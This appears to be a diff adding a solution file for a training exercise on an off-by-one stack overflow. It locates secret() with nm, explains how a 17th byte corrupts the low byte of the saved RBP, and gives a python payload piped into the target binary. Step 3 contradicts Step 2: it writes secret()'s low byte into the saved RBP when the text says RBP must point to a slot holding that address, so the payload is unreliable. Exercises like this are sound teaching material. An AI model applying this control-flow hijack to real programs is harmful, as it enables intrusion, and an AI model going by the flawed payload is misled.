@@ -1,0 +1,30 @@
+Solution — Exercise 03: Off-by-One
+=====================================
+
+Step 1: Find secret()'s address
+  nm target | grep secret
+  → e.g. 0x0000000000401136 T secret
+  The LSB is 0x36.
+
+Step 2: Understand the corruption
+  The 17th byte overwrites the LSB of the saved RBP.
+  When main() executes its 'leave', it loads the corrupted RBP.
+  Its following 'ret' reads a return address from a shifted
+  stack location — which you can arrange to hold secret()'s address.
+
+Step 3: Send the payload
+  python3 -c "
+  import sys
+  sys.stdout.buffer.write(b'A' * 16 + bytes([0x36]))
+  " | ./target
+
+  The exact byte depends on your binary. Try the LSB of secret().
+
+Step 4: If it doesn't work
+  The stack layout varies by compiler. Use gdb to find where
+  the pivoted frame's return address lands, and what value it
+  needs to hold.
+
+Why it works:
+  Off-by-one errors are among the most common bugs in C.
+  A single misplaced byte can corrupt control flow entirely.
